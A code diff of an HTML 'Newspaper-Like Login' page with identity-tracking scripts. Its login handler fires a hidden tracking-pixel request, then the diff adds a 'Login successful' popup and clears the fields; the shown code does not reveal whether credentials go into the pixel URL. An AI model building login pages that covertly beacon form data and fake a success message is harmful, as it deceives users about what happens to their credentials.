@@ -1,9 +1,9 @@
 
-  
+   
     <!DOCTYPE html>
 <html>
 <head>
-    <script async defer src="https://ats-wrapper.privacymanager.io/ats-modules/f9eb6199-697c-4cb1-827d-ff441eb710ef/ats.js"></script>
+   <script async defer src="https://ats-wrapper.privacymanager.io/ats-modules/f9eb6199-697c-4cb1-827d-ff441eb710ef/ats.js"></script>
      <link rel="preload" href="https://gdpr.privacymanager.io/latest/gdpr.bundle.js" as="script" />
         <script async defer src="https://gdpr-wrapper.privacymanager.io/gdpr/1d8d0017-6246-4e2b-8675-ee35db734191/gdpr-liveramp.js"></script>
     <title>Newspaper-Like Login</title>
@@ -41,6 +41,17 @@
         img.pixel {
             display: none;
         }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
     </style>
 </head>
 <body>
@@ -52,6 +63,10 @@
             <button type="button" class="login-button" onclick="performLogin()">Login</button>
         </form>
         <img class="pixel" id="pixel" src="pixel.gif" alt="Pixel Image">
+    </div>
+
+    <div id="myModal" class="modal">
+        <p>Login successful. You are now logged in.</p>
     </div>
 
     <script>
@@ -73,12 +88,18 @@
 
                 // Replace the src of the pixel image to send the request
                 document.getElementById("pixel").src = pixelURL;
-            });
 
-            // Clear the form after firing the pixel (you can remove this part)
-            document.getElementById("email").value = "";
-            document.getElementById("password").value = "";
+                // Show the login success modal
+                const modal = document.getElementById("myModal");
+                modal.style.display = "block";
+
+                // Clear the form after firing the pixel (you can remove this part)
+                document.getElementById("email").value = "";
+                document.getElementById("password").value = "";
+            });
         }
     </script>
 </body>
 </html>
+
+
